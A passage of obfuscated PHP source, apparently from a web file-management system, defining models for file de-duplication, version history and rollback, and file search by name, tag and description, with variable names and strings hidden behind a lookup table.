$´¬ŒÕÄú[32]); foreach ($¯’éïß¯ as $È±ıàª) { $©¥ûÍà“ = $ŠœÅËêú[$È±ıàª[$´¬ŒÕÄú[32]]]; $²ô•À‡ù = $©¥ûÍà“[$´¬ŒÕÄú[411]]; $this->_copyApplyMeta($©¥ûÍà“, $Ô×Ëˆ”ƒ); if ($È±ıàª[$´¬ŒÕÄú[33]] == $´¬ŒÕÄú[75]) { $È±ıàª[$´¬ŒÕÄú[84]] = $¶û™†¸ƒ->getPathInner($È±ıàª[$´¬ŒÕÄú[84]]); $this->_copyChildTo($¶û™†¸ƒ, $È±ıàª[$´¬ŒÕÄú[84]], $²ô•À‡ù, $Ñ°ôè¢Å, $Ô×Ëˆ”ƒ, $§İ™ãé»); } } } private function _addFiles($Ê‰û÷à, $¯½éŠã, $Šš³É¾†) { $Éâ£Â²Ä =& $_SERVER[ïëó©ÒÚ]; if (!$¯½éŠã || count($¯½éŠã) == 0) { return array(); } $ÎÇæõÕ˜ = array(); foreach ($¯½éŠã as &$‹Ö‡Œ·Ë) { Hook::trigger($Éâ£Â²Ä[616], $‹Ö‡Œ·Ë); $‹Ö‡Œ·Ë[$Éâ£Â²Ä[84]] = $Ê‰û÷à->getPathInner($‹Ö‡Œ·Ë[$Éâ£Â²Ä[84]]); $¼¬›É×ç = $Ê‰û÷à->hashSimple($‹Ö‡Œ·Ë[$Éâ£Â²Ä[84]]); $¸ŒôŒ¤Ó = $Ê‰û÷à->hashMd5($‹Ö‡Œ·Ë[$Éâ£Â²Ä[84]]); if (strlen($¸ŒôŒ¤Ó) > 10 && !isset($ÎÇæõÕ˜[$¸ŒôŒ¤Ó])) { $ÎÇæõÕ˜[$¸ŒôŒ¤Ó] = array(); } $‹Ö‡Œ·Ë[$Éâ£Â²Ä[177]] = $¼¬›É×ç; $‹Ö‡Œ·Ë[$Éâ£Â²Ä[176]] = $¸ŒôŒ¤Ó; $ÎÇæõÕ˜[$¸ŒôŒ¤Ó][] =& $‹Ö‡Œ·Ë; if (count($ÎÇæõÕ˜[$¸ŒôŒ¤Ó]) > 1) { $‹Ö‡Œ·Ë[$Éâ£Â²Ä[615]] = !0; } Hook::trigger($Éâ£Â²Ä[617], $‹Ö‡Œ·Ë); } unset($‹Ö‡Œ·Ë); $ŠƒôŸÉĞ = array($Éâ£Â²Ä[176] => array($Éâ£Â²Ä[7], array_keys($ÎÇæõÕ˜))); $ññ‚Á‡Ä = Model($Éâ£Â²Ä[618]); $ØÒı¡‡ = $ññ‚Á‡Ä->where($ŠƒôŸÉĞ)->select(); $ØÒı¡‡ = $ØÒı¡‡ ? $ØÒı¡‡ : array(); foreach ($ØÒı¡‡ as $ƒ¸À„âÁ) { if (!isset($ÎÇæõÕ˜[$ƒ¸À„âÁ[$Éâ£Â²Ä[176]]])) { continue; } $…ÒÈÇ±Ğ = $ÎÇæõÕ˜[$ƒ¸À„âÁ[$Éâ£Â²Ä[176]]]; foreach ($…ÒÈÇ±Ğ as &$‹Ö‡Œ·Ë) { $‹Ö‡Œ·Ë[$Éâ£Â²Ä[477]] = $ƒ¸À„âÁ[$Éâ£Â²Ä[477]]; $‹Ö‡Œ·Ë[$Éâ£Â²Ä[615]] = !0; } unset($‹Ö‡Œ·Ë); } $¤´¿‹ = array(); foreach ($¯½éŠã as $ã˜ıÍ¾«) { Hook::trigger($Éâ£Â²Ä[619], $ã˜ıÍ¾«); if (isset($ã˜ıÍ¾«[$Éâ£Â²Ä[615]]) && $ã˜ıÍ¾«[$Éâ£Â²Ä[615]]) { Hook::trigger($Éâ£Â²Ä[620], $ã˜ıÍ¾«); continue; } $©Ôşø›ù = $Ê‰û÷à->getPathInner($ã˜ıÍ¾«[$Éâ£Â²Ä[84]]); $ˆü¢Ç = $ññ‚Á‡Ä->addFileMake($©Ôşø›ù, $ã˜ıÍ¾«[$Éâ£Â²Ä[76]], $ã˜ıÍ¾«[$Éâ£Â²Ä[177]], $ã˜ıÍ¾«[$Éâ£Â²Ä[176]], $ã˜ıÍ¾«[$Éâ£Â²Ä[32]], $Šš³É¾†); Hook::trigger($Éâ£Â²Ä[620], $ã˜ıÍ¾«); if (!is_array($ˆü¢Ç)) { continue; } $¤´¿‹[] = $ˆü¢Ç; } $ññ‚Á‡Ä->addAll($¤´¿‹); $ŠƒôŸÉĞ = array($Éâ£Â²Ä[176] => array($Éâ£Â²Ä[7], array_keys($ÎÇæõÕ˜))); $ØÒı¡‡ = $ññ‚Á‡Ä->where($ŠƒôŸÉĞ)->select(); $ØÒı¡‡ = $ØÒı¡‡ ? $ØÒı¡‡ : array(); foreach ($ØÒı¡‡ as $ƒ¸À„âÁ) { if (!isset($ÎÇæõÕ˜[$ƒ¸À„âÁ[$Éâ£Â²Ä[176]]])) { continue; } $Û¢¹ŠÁ =& $ÎÇæõÕ˜[$ƒ¸À„âÁ[$Éâ£Â²Ä[176]]]; foreach ($Û¢¹ŠÁ as &$‹Ö‡Œ·Ë) { $‹Ö‡Œ·Ë[$Éâ£Â²Ä[477]] = $ƒ¸À„âÁ[$Éâ£Â²Ä[477]]; } unset($‹Ö‡Œ·Ë); } $¼ÅğÏé = array(); foreach ($¯½éŠã as $“Í­Ñˆé) { $¼ÅğÏé[$“Í­Ñˆé[$Éâ£Â²Ä[32]]] = $“Í­Ñˆé; } return $¼ÅğÏé; } } define($_SERVER[ïëó©ÒÚ][621], $_SERVER[ïëó©ÒÚ][622]); $hlzgnfxioq = $_SERVER[ïëó©ÒÚ][623]; goto BªŠ†Ù“ô; fÍ™ŞîËİ: class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\137\163\x6f\x75\x72\143\x65\137\150\x69\x73\x74\x6f\162\171"; public function historyCount($ÌÂè®æˆ) { $¯•„å°ˆ =& $_SERVER[ïëó©ÒÚ]; if (!$ÌÂè®æˆ) { return array(); } if (is_string($ÌÂè®æˆ) || is_int($ÌÂè®æˆ)) { $ÌÂè®æˆ = array($ÌÂè®æˆ); } $Ÿ¬Ô¥Š™ = array($¯•„å°ˆ[411], $¯•„å°ˆ[1866] => $¯•„å°ˆ[509]); $¸¶«¡µœ = array($¯•„å°ˆ[411] => array($¯•„å°ˆ[7], $ÌÂè®æˆ)); $ÂšàÆğ› = $this->field($Ÿ¬Ô¥Š™)->where($¸¶«¡µœ)->group($¯•„å°ˆ[411])->select(); return array_to_keyvalue($ÂšàÆğ›, $¯•„å°ˆ[411], $¯•„å°ˆ[509]); } public function addHistory($œ¼Û¥Ä, $šó¦ã = '') { $ò‡ÂÓê€ =& $_SERVER[ïëó©ÒÚ]; $ÃØÉ€› = array($ò‡ÂÓê€[426] => $œ¼Û¥Ä[$ò‡ÂÓê€[411]], $ò‡ÂÓê€[1652] => isset($œ¼Û¥Ä[$ò‡ÂÓê€[465]]) ? $œ¼Û¥Ä[$ò‡ÂÓê€[465]] : $œ¼Û¥Ä[$ò‡ÂÓê€[463]], $ò‡ÂÓê€[478] => $œ¼Û¥Ä[$ò‡ÂÓê€[477]], $ò‡ÂÓê€[594] => $œ¼Û¥Ä[$ò‡ÂÓê€[76]], $ò‡ÂÓê€[2072] => $šó¦ã); if ($GLOBALS[$ò‡ÂÓê€[6]][$ò‡ÂÓê€[89]][$ò‡ÂÓê€[1212]] >= 1) { $this->historyAutoClear($ÃØÉ€›[$ò‡ÂÓê€[411]]); $this->add($ÃØÉ€›); } Hook::trigger($ò‡ÂÓê€[2073], $ÃØÉ€›); Model($ò‡ÂÓê€[2074])->eventFileEdit($œ¼Û¥Ä[$ò‡ÂÓê€[411]]); } private function historyAutoClear($ø¿æàå–) { $½³‚×— =& $_SERVER[ïëó©ÒÚ]; $û¼¿Åï = Model($½³‚×—[780])->get($½³‚×—[1234]); $¸œ‰· = $GLOBALS[$½³‚×—[6]][$½³‚×—[89]][$½³‚×—[1212]]; $Ø´ÄŠÌ = $û¼¿Åï == $½³‚×—[1235] ? min(5, $¸œ‰·) : $¸œ‰·; $Ø´ÄŠÌ = $Ø´ÄŠÌ <= 0 ? 0 : $Ø´ÄŠÌ - 1; if ($Ø´ÄŠÌ >= 500) { return; } $§Ëñ±ü = array($½³‚×—[426] => $ø¿æàå–); $ªËò´ÚÏ = $this->field($½³‚×—[2075])->where($§Ëñ±ü)->order($½³‚×—[2069])->select(); if (!$ªËò´ÚÏ || $Ø´ÄŠÌ >= count($ªËò´ÚÏ)) { return; } $’™ƒ·“ = array_to_keyvalue($ªËò´ÚÏ, $½³‚×—[12], $½³‚×—[399]); $’™ƒ·“ = array_slice($’™ƒ·“, $Ø´ÄŠÌ); $‘¤Ãà‚± = array_to_keyvalue($ªËò´ÚÏ, $½³‚×—[12], $½³‚×—[477]); $‘¤Ãà‚± = array_slice($‘¤Ãà‚±, $Ø´ÄŠÌ); if (!$’™ƒ·“ || !$‘¤Ãà‚±) { return; } $§Ëñ±ü = array($½³‚×—[428] => array($½³‚×—[7], $’™ƒ·“)); $this->where($§Ëñ±ü)->delete(); Model($½³‚×—[480])->remove($‘¤Ãà‚±); } public function listData($Îì×‚„¸) { $ùØªÏªğ =& $_SERVER[ïëó©ÒÚ]; $è•‘Çˆñ = array($ùØªÏªğ[426] => $Îì×‚„¸); $úšô‘Í = $ùØªÏªğ[2076]; $÷–Ã¿ÔŒ = $this->field($úšô‘Í)->where($è•‘Çˆñ)->order($ùØªÏªğ[2069])->selectPage(); $this->_listAppendUser($÷–Ã¿ÔŒ[$ùØªÏªğ[369]]); $×ó…­¹„ = Model($ùØªÏªğ[780])->get($ùØªÏªğ[1234]); $˜›§È¢– = 5; if ($×ó…­¹„ == $ùØªÏªğ[1235]) { $÷–Ã¿ÔŒ[$ùØªÏªğ[369]] = array_slice($÷–Ã¿ÔŒ[$ùØªÏªğ[369]], 0, $˜›§È¢–); $÷–Ã¿ÔŒ[$ùØªÏªğ[366]] = array($ùØªÏªğ[2077] => 1, $ùØªÏªğ[2078] => 20, $ùØªÏªğ[2079] => 1, $ùØªÏªğ[2080] => count($÷–Ã¿ÔŒ[$ùØªÏªğ[369]])); } return $÷–Ã¿ÔŒ; } protected function _listAppendUser(&$âõÎ¦¤Ò) { $ñÂùÌÁå =& $_SERVER[ïëó©ÒÚ]; $óİê€Ö = array_to_keyvalue($âõÎ¦¤Ò, $ñÂùÌÁå[12], $ñÂùÌÁå[1661]); $Âñ”÷¦Œ = Model($ñÂùÌÁå[544])->userListInfo($óİê€Ö); foreach ($âõÎ¦¤Ò as &$Ûàô¡›°) { $œ€‚õŞ¦ = $Ûàô¡›°[$ñÂùÌÁå[1661]]; $Ûàô¡›°[$ñÂùÌÁå[463]] = $Âñ”÷¦Œ[$œ€‚õŞ¦] ? $Âñ”÷¦Œ[$œ€‚õŞ¦] : !1; } unset($Ûàô¡›°); } public function fileInfo($Üé¸¤ÏÄ) { $Òú»°ÏÂ =& $_SERVER[ïëó©ÒÚ]; $Ô£ğÇÒ = $this->tablePrefix; $‚Ë¹äÙè = "{$Ô£ğÇÒ}\151\157\137\x66\151\154\145\x20\146\x69\154\x65\x73\40\157\x6e\x20\146\151\x6c\145\163\x2e\146\151\154\145\111\x44\x20\x3d\x20\150\x69\x73\164\157\162\x79\56\146\151\154\x65\111\x44"; return $this->alias($Òú»°ÏÂ[2081])->where(array($Òú»°ÏÂ[428] => $Üé¸¤ÏÄ))->join($‚Ë¹äÙè, $Òú»°ÏÂ[2082])->find(); } public function removeItem($§ê“Ú‹½) { $Õù¤Û¨ =& $_SERVER[ïëó©ÒÚ]; $¦Ü£Áäæ = array($Õù¤Û¨[428] => $§ê“Ú‹½); $±½Ôà¡‰ = $this->where($¦Ü£Áäæ)->find(); if ($±½Ôà¡‰) { $”µ€¨–§ = $this->where($¦Ü£Áäæ)->delete(); Model($Õù¤Û¨[480])->remove($±½Ôà¡‰[$Õù¤Û¨[477]]); return $”µ€¨–§; } return !1; } public function removeBySource($âšËÑç») { $Æ¿Ü¶ÔŒ =& $_SERVER[ïëó©ÒÚ]; if (!$âšËÑç») { return !1; } if (!is_array($âšËÑç»)) { $âšËÑç» = array($âšËÑç»); } $Ë«•œŸ = array($Æ¿Ü¶ÔŒ[426] => array($Æ¿Ü¶ÔŒ[7], $âšËÑç»)); $İì¡ì‚ = $this->field($Æ¿Ü¶ÔŒ[478])->where($Ë«•œŸ)->select(); if ($İì¡ì‚) { $this->where($Ë«•œŸ)->delete(); $£°óÒ­ = array_to_keyvalue($İì¡ì‚, $Æ¿Ü¶ÔŒ[12], $Æ¿Ü¶ÔŒ[477]); Model($Æ¿Ü¶ÔŒ[480])->remove($£°óÒ­); } return !0; } public function setDetail($ŞñÇ§¾ê, $†»—êİù) { $ô¡Ü’™£ =& $_SERVER[ïëó©ÒÚ]; return $this->where(array($ô¡Ü’™£[428] => $ŞñÇ§¾ê))->save(array($ô¡Ü’™£[2072] => $†»—êİù)); } public function rollbackToItem($Ç¾ˆàÆ¸, $§€š©Ü•) { $Ä‰´¼  =& $_SERVER[ïëó©ÒÚ]; $ò¹ ÒÍ• = Model($Ä‰´¼ [835])->sourceInfo($Ç¾ˆàÆ¸); $this->addHistory($ò¹ ÒÍ•, LNG($Ä‰´¼ [2083])); $Ç±“Ìâ‚ = $this->find($§€š©Ü•); $üºÚ…·Ê = array($Ä‰´¼ [477] => $Ç±“Ìâ‚[$Ä‰´¼ [477]], $Ä‰´¼ [76] => $Ç±“Ìâ‚[$Ä‰´¼ [76]], $Ä‰´¼ [85] => time(), $Ä‰´¼ [465] => USER_ID); Model($Ä‰´¼ [835])->where(array($Ä‰´¼ [411] => $Ç¾ˆàÆ¸))->save($üºÚ…·Ê); return $this->where(array($Ä‰´¼ [428] => $§€š©Ü•))->delete(); } public function clearSame($ı×—‚ÉÄ) { $ø…•Ê” =& $_SERVER[ïëó©ÒÚ]; $ÚÖÀ½ â = $this->listData($ı×—‚ÉÄ); $Æ®¹æÎÂ = array_to_keyvalue_group($ÚÖÀ½ â, $ø…•Ê”[477]); $à®Àô˜² = array(); $¿ºÚ™´« = array(); foreach ($Æ®¹æÎÂ as $âŸÅÚ—ô) { if (!$âŸÅÚ—ô || count($âŸÅÚ—ô) <= 1) { continue; } foreach ($âŸÅÚ—ô as $ ª ë¢â) { $à®Àô˜²[] = $ ª ë¢â[$ø…•Ê”[477]]; $¿ºÚ™´«[] = $ ª ë¢â[$ø…•Ê”[399]]; } } if (!$¿ºÚ™´«) { return; } $this->where(array($ø…•Ê”[399] => array($ø…•Ê”[7], $¿ºÚ™´«)))->delete(); Model($ø…•Ê”[480])->remove($à®Àô˜²); } public function userSpace() { $÷‡ŸåÑ¸ =& $_SERVER[ïëó©ÒÚ]; $Ìç °éË = $this->tablePrefix; $ß¦ö‹¥á = array($÷‡ŸåÑ¸[1652] => USER_ID); $ÒÈÊİ¾ò = "{$Ìç °éË}\x69\x6f\137\146\151\154\x65\40\146\x69\x6c\145\163\40\157\156\x20\x66\151\x6c\145\x73\x2e\x66\x69\x6c\x65\x49\104\x20\x3d\x20\150\151\x73\x74\157\162\x79\56\x66\x69\154\145\111\104"; return $this->alias($÷‡ŸåÑ¸[2081])->where($ß¦ö‹¥á)->join($ÒÈÊİ¾ò, $÷‡ŸåÑ¸[2082])->sum($÷‡ŸåÑ¸[76]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($ì§ñ†¯å) { $¢ĞÀ ‡± =& $_SERVER[ïëó©ÒÚ]; $Šñ–©ˆ© = KodIO::fileTypeList(); $©¬õìÑ = $Šñ–©ˆ©[$ì§ñ†¯å]; if (!$©¬õìÑ) { return array(); } $¡èü‹Ãœ = $©¬õìÑ[$¢ĞÀ ‡±[174]]; $à³›é¿ = $¢ĞÀ ‡±[7]; if (!$©¬õìÑ[$¢ĞÀ ‡±[174]]) { $¶·Ğ†İÚ = array_to_keyvalue($Šñ–©ˆ©, $¢ĞÀ ‡±[12], $¢ĞÀ ‡±[174]); $¡èü‹Ãœ = implode($¢ĞÀ ‡±[50], $¶·Ğ†İÚ); $à³›é¿ = $¢ĞÀ ‡±[2084]; } $Õ¿³¢›² = explode($¢ĞÀ ‡±[50], trim($¡èü‹Ãœ, $¢ĞÀ ‡±[50])); return array($à³›é¿, $Õ¿³¢›²); } public function listPathType($×Éìø¹) { $¹¦ãÌ¬ =& $_SERVER[ïëó©ÒÚ]; $ĞŒ²ğÃì = $this->fileTypeWhere($×Éìø¹); if (!$ĞŒ²ğÃì) { return array(); } $–àé® = USER_ID; $Ó—ÓØê‘ = Model($¹¦ãÌ¬[544])->getInfo($–àé®); $æÕ øõÚ = array($¹¦ãÌ¬[595] => SourceModel::TYPE_USER, $¹¦ãÌ¬[530] => array($¹¦ãÌ¬[559], $¹¦ãÌ¬[540] . $Ó—ÓØê‘[$¹¦ãÌ¬[86]][$¹¦ãÌ¬[411]] . $¹¦ãÌ¬[560]), $¹¦ãÌ¬[596] => $–àé®, $¹¦ãÌ¬[592] => 0, $¹¦ãÌ¬[593] => $ĞŒ²ğÃì); return $this->listSource($æÕ øõÚ); } public function listSearch($Æôç˜Š×, $ˆè¢ÙÔ¯ = 300) { $¹ˆ¤ò¸· =& $_SERVER[ïëó©ÒÚ]; if (isset($Æôç˜Š×[$¹ˆ¤ò¸·[1927]]) && $Æôç˜Š×[$¹ˆ¤ò¸·[1927]]) { $Æôç˜Š×[$¹ˆ¤ò¸·[1927]] = str_replace($¹ˆ¤ò¸·[384], $¹ˆ¤ò¸·[2085], trim($Æôç˜Š×[$¹ˆ¤ò¸·[1927]])); } $ä¹™¯åë = $this->_parseSearchWhere($Æôç˜Š×); if (!isset($ä¹™¯åë[$¹ˆ¤ò¸·[440]])) { $ä¹™¯åë[$¹ˆ¤ò¸·[440]] = 0; } $ì…£ş–“ = $¹ˆ¤ò¸·[2086]; $¨ùË“¾¿ = $ä¹™¯åë; $¿›—¡¡ = $ì…£ş–“; $this->_listSearchBindPinyin($Æôç˜Š×, $ä¹™¯åë, $ì…£ş–“); $this->alias($¹ˆ¤ò¸·[455])->_makeOrder(); $ä¹™¯åë = $this->parseWhereLike($ä¹™¯åë); $Ğ…ŒÊ¼º = $this->distinct(!0)->field($ì…£ş–“)->where($ä¹™¯åë)->selectPage($ˆè¢ÙÔ¯); if ($GLOBALS[$¹ˆ¤ò¸·[6]][$¹ˆ¤ò¸·[381]][$¹ˆ¤ò¸·[382]] && Input::check($Æôç˜Š×[$¹ˆ¤ò¸·[1927]], $¹ˆ¤ò¸·[602]) && $Ğ…ŒÊ¼º[$¹ˆ¤ò¸·[366]][$¹ˆ¤ò¸·[353]] == 1 && $Ğ…ŒÊ¼º[$¹ˆ¤ò¸·[366]][$¹ˆ¤ò¸·[367]] == 0) { $Ğ…ŒÊ¼º = $this->distinct(!0)->field($ì…£ş–“)->where($¨ùË“¾¿)->limit(1000)->select(); $Ğ…ŒÊ¼º = array_page_split($Ğ…ŒÊ¼º, !1, $ˆè¢ÙÔ¯); } $this->_listSearchFileContent($Ğ…ŒÊ¼º, $Æôç˜Š×, $¿›—¡¡, $¨ùË“¾¿); $this->_listSearchDesc($Ğ…ŒÊ¼º, $Æôç˜Š×, $¿›—¡¡); $this->_listSearchTag($Ğ…ŒÊ¼º, $Æôç˜Š×, $¿›—¡¡); $this->_listSearchGroupTag($Ğ…ŒÊ¼º, $Æôç˜Š×, $¿›—¡¡); $this->_listDataApply($Ğ…ŒÊ¼º[$¹ˆ¤ò¸·[369]]); $this->_listMake($Ğ…ŒÊ¼º); return $Ğ…ŒÊ¼º; } private function _listSearchFileContent(&$§ßÉÆÌ, $Î‚ç›àè, $³¦“»­£, $·áÅ°ş¯) { $¹¿·ï =& $_SERVER[ïëó©ÒÚ]; if (!$Î‚ç›àè[$¹¿·ï[1927]] || $§ßÉÆÌ[$¹¿·ï[366]][$¹¿·ï[353]] > 1) { return; } if (!isset($·áÅ°ş¯[$¹¿·ï[32]]) || !is_array($Î‚ç›àè[$¹¿·ï[477]])) { return; } $·áÅ°ş¯[$¹¿·ï[477]] = array($¹¿·ï[7], $Î‚ç›àè[$¹¿·ï[477]]); unset($·áÅ°ş¯[$¹¿·ï[32]]); unset($Î‚ç›àè[$¹¿·ï[477]]); $ªÙÊê¸ş = $this->field($³¦“»­£)->where($·áÅ°ş¯)->limit($¹¿·ï[2087])->select(); if (!$ªÙÊê¸ş || count($ªÙÊê¸ş) == 0) { return; } $§ßÉÆÌ[$¹¿·ï[369]] = array_merge($ªÙÊê¸ş, $§ßÉÆÌ[$¹¿·ï[369]]); $§ßÉÆÌ[$¹¿·ï[366]][$¹¿·ï[367]] += count($ªÙÊê¸ş); } private function _listSearchTag(&$«¶‚£õ», $‚‘ğ¾¿Ù, $¨Àî‰®‚) { $åÛç¸Ãê =& $_SERVER[ïëó©ÒÚ]; if (!$‚‘ğ¾¿Ù[$åÛç¸Ãê[1927]] || $«¶‚£õ»[$åÛç¸Ãê[366]][$åÛç¸Ãê[353]] > 1) { return; } $—¸Á¡˜¼ = Model($åÛç¸Ãê[2088])->listData(); $æìß½Çì = array(); $‡™›ğ´ó = $‚‘ğ¾¿Ù[$åÛç¸Ãê[1927]]; foreach ($—¸Á¡˜¼ as $ˆÔ¥Åıø) { $² ÚŒ÷ó = $ˆÔ¥Åıø[$åÛç¸Ãê[32]]; $©­ş†‚ = str_replace($åÛç¸Ãê[53], $åÛç¸Ãê[12], Pinyin::get($² ÚŒ÷ó)); if (stripos($² ÚŒ÷ó, $‡™›ğ´ó) !== !1 || stripos($©­ş†‚, $‡™›ğ´ó) !== !1) { $æìß½Çì[] = $ˆÔ¥Åıø[$åÛç¸Ãê[399]]; } } if (!$æìß½Çì) { return; } $—†Ê­•ı = array($åÛç¸Ãê[435] => array($åÛç¸Ãê[7], $æìß½Çì), $åÛç¸Ãê[1661] => USER_ID); $ñÚ¨ = Model($åÛç¸Ãê[437])->field($åÛç¸Ãê[84])->where($—†Ê­•ı)->select(); $ñÚ¨ = array_to_keyvalue($ñÚ¨, $åÛç¸Ãê[12], $åÛç¸Ãê[84]); $î¦‚¡‘ = array_unique($ñÚ¨); $this->_listSearchMerge($«¶‚£õ», $‚‘ğ¾¿Ù, $¨Àî‰®‚, $î¦‚¡‘); } private function _listSearchDesc(&$œâÚÚ…ô, $ßıÖÁ¢, $Ÿ¤¾Ş») { $¿Öè‰ÙŸ =& $_SERVER[ïëó©ÒÚ]; if (!$ßıÖÁ¢[$¿Öè‰ÙŸ[1927]] || $œâÚÚ…ô[$¿Öè‰ÙŸ[366]][$¿Öè‰ÙŸ[353]] > 1) { return; } $ÔªÚ™¯ú = array($¿Öè‰ÙŸ[94] => $¿Öè‰ÙŸ[462], $¿Öè‰ÙŸ[374] => array($¿Öè‰ÙŸ[383], $¿Öè‰ÙŸ[1929] . $ßıÖÁ¢[$¿Öè‰ÙŸ[1927]] . $¿Öè‰ÙŸ[1929])); $ä…°‡ = !1; if ($ä…°‡) { $Ï‰Àú³ = $this->listSearchChildren($ßıÖÁ¢[$¿Öè‰ÙŸ[441]]); $Ï‰Àú³ = array_unique($Ï‰Àú³); if (!$Ï‰Àú³) { return; } $ÔªÚ™¯ú[$¿Öè‰ÙŸ[411]] = array($¿Öè‰ÙŸ[7], $Ï‰Àú³); } $õ‚ÙÁÌ = Model($¿Öè‰ÙŸ[578])->field($¿Öè‰ÙŸ[411])->where($ÔªÚ™¯ú)->limit(5000)->select(); $ìºî—‘† = array_to_keyvalue($õ‚ÙÁÌ, $¿Öè‰ÙŸ[12], $¿Öè‰ÙŸ[411]); $this->_listSearchMerge($œâÚÚ…ô, $ßıÖÁ¢, $Ÿ¤¾Ş», $ìºî—‘†); } private function _listSearchGroupTag(&$°øó„Ÿú, $£ş…œÂî, $×ı‚ôÉ) { $Ş—ÍğÕ« =& $_SERVER[ïëó©ÒÚ]; if (!$£ş…œÂî[$Ş—ÍğÕ«[1927]] || $°øó„Ÿú[$Ş—ÍğÕ«[366]][$Ş—ÍğÕ«[353]] > 1 || !$£ş…œÂî[$Ş—ÍğÕ«[441]]) { return; } $àèü¥âĞ = $this->sourceInfo($£ş…œÂî[$Ş—ÍğÕ«[441]]); if (!$àèü¥âĞ || $àèü¥âĞ[$Ş—ÍğÕ«[420]] != SourceModel::TYPE_GROUP) { return; } $ò²¡â…³ = $àèü¥âĞ[$Ş—ÍğÕ«[514]]; $…ö©¬³ú = Model($Ş—ÍğÕ«[2089])->get($ò²¡â…³); $ÁÕå‚¹ = array(); $ÆùµóŸ² = $£ş…œÂî[$Ş—ÍğÕ«[1927]]; foreach ($…ö©¬³ú[$Ş—ÍğÕ«[369]] as $ÈéĞ§ÆÙ) { $±”£ğ¬€ = $ÈéĞ§ÆÙ[$Ş—ÍğÕ«[32]]; $®çîğ¾Û = str_replace($Ş—ÍğÕ«[53], $Ş—ÍğÕ«[12], Pinyin::get($±”£ğ¬€)); if (stripos($±”£ğ¬€, $ÆùµóŸ²) !== !1 || stripos($®çîğ¾Û, $ÆùµóŸ²) !== !1) { $ÁÕå‚¹[] = $ÈéĞ§ÆÙ[$Ş—ÍğÕ«[399]]; } } if (!$ÁÕå‚¹) { return; } $–ïßÈ´ = array($Ş—ÍğÕ«[435] => array($Ş—ÍğÕ«[7], $ÁÕå‚¹), $Ş—ÍğÕ«[1661] => 0, $Ş—ÍğÕ«[33] => $Ş—ÍğÕ«[1949] . $ò²¡â…³); $ÂÀ©ƒœƒ = Model($Ş—ÍğÕ«[437])->field($Ş—ÍğÕ«[84])->where($–ïßÈ´)->select(); $ÂÀ©ƒœƒ = array_to_keyvalue($ÂÀ©ƒœƒ, $Ş—ÍğÕ«[12], $Ş—ÍğÕ«[84]); $öôäÌËš = array_unique($ÂÀ©ƒœƒ); $this->_listSearchMerge($°øó„Ÿú, $£ş…œÂî, $×ı‚ôÉ, $öôäÌËš); } private function _listSearchMerge(&$çêËŒ›ô, $™ÛÃŠ˜, $ìŠ¦­İ®, $˜ÌŠ³é´) { $ç¦Õ¨éÇ =& $_SERVER[ïëó©ÒÚ]; if (!$˜ÌŠ³é´) { return; } $±³æÔ§¤ = array_to_keyvalue($çêËŒ›ô[$ç¦Õ¨éÇ[369]], $ç¦Õ¨éÇ[12], $ç¦Õ¨éÇ[411]); $æëáêÁÕ = array_diff($˜ÌŠ³é´, $±³æÔ§¤); if (!$æëáêÁÕ) { return; } $şƒ¢Ç¾… = array($ç¦Õ¨éÇ[411] => array($ç¦Õ¨éÇ[7], $æëáêÁÕ)); $Ò½¯²ş = $this->field($ìŠ¦­İ®)->where($şƒ¢Ç¾…)->select(); if (!$Ò½¯²ş) { return; } $„¦­Ø‚ = array(); foreach ($Ò½¯²ş as $êÊñÚ¤ô) { if ($this->_listSearchFilter($êÊñÚ¤ô, $™ÛÃŠ˜)) { $„¦­Ø‚[] = $êÊñÚ¤ô; } } $çêËŒ›ô[$ç¦Õ¨éÇ[369]] = array_merge($„¦­Ø‚, $çêËŒ›ô[$ç¦Õ¨éÇ[369]]); $çêËŒ›ô[$ç¦Õ¨éÇ[366]][$ç¦Õ¨éÇ[367]] += count($„¦­Ø‚); } private function _listSearchFilter($ºğ¸ÔÍ®, $á¶ŸË¤Ù) { $‘ÓÖ×°Á =& $_SERVER[ïëó©ÒÚ]; $”¬×‡ùˆ = $ºğ¸ÔÍ®[$‘ÓÖ×°Á[419]] == $‘ÓÖ×°Á[88]; if (!strstr($ºğ¸ÔÍ®[$‘ÓÖ×°Á[530]], $‘ÓÖ×°Á[50] . $á¶ŸË¤Ù[$‘ÓÖ×°Á[441]] . $‘ÓÖ×°Á[50])) { return !1; } if (isset($á¶ŸË¤Ù[$‘ÓÖ×°Á[421]]) && $á¶ŸË¤Ù[$‘ÓÖ×°Á[421]] != $‘ÓÖ×°Á[1888]) { if ($á¶ŸË¤Ù[$‘ÓÖ×°Á[421]] == $‘ÓÖ×°Á[75] && !$”¬×‡ùˆ) { return !1; } if ($á¶ŸË¤Ù[$‘ÓÖ×°Á[421]] != $‘ÓÖ×°Á[75] && $”¬×‡ùˆ) { return !1; } if (!strstr($ºğ¸ÔÍ®[$‘ÓÖ×°Á[174]], $‘ÓÖ×°Á[50] . $á¶ŸË¤Ù[$‘ÓÖ×°Á[421]] . $‘ÓÖ×°Á[50])) { return !1; } } if (isset($á¶ŸË¤Ù[$‘ÓÖ×°Á[2090]]) && $á¶ŸË¤Ù[$‘ÓÖ×°Á[2090]] < $ºğ¸ÔÍ®[$‘ÓÖ×°Á[76]]) { return !1; } if (isset($á¶ŸË¤Ù[$‘ÓÖ×°Á[2091]]) && $á¶ŸË¤Ù[$‘ÓÖ×°Á[2091]] > $ºğ¸ÔÍ®[$‘ÓÖ×°Á[76]]) { return !1; } if (isset($á¶ŸË¤Ù[$‘ÓÖ×°Á[609]]) && $á¶ŸË¤Ù[$‘ÓÖ×°Á[609]] != $ºğ¸ÔÍ®[$‘ÓÖ×°Á[465]]) { return !1; } return !0; } public function listSearchChildren($«³©²øÅ, $ìÕÆ÷Æ¶ = 5000) { $¨¬‰ƒ’– =& $_SERVER[ïëó©ÒÚ]; $Ç¢¼–Ö¼ = array(); $ª–éë„Ä = $this->sourceInfo($«³©²øÅ); $Á×ÂÍÈÉ = array($¨¬‰ƒ’–[530] => array($¨¬‰ƒ’–[383], $ª–éë„Ä[$¨¬‰ƒ’–[530]] . $ª–éë„Ä[$¨¬‰ƒ’–[411]] . $¨¬‰ƒ’–[560])); $Ë£ã«Á = $this->field($¨¬‰ƒ’–[76])->where($Á×ÂÍÈÉ)->limit($ìÕÆ÷Æ¶ + 1)->select(); $ãêÍıÇ¯ = is_array($Ë£ã«Á) ? count($Ë£ã«Á) : 0; if ($ãêÍıÇ¯ > $ìÕÆ÷Æ¶) { return $this->_listSearchChildrenNear($«³©²øÅ, $ìÕÆ÷Æ¶); } 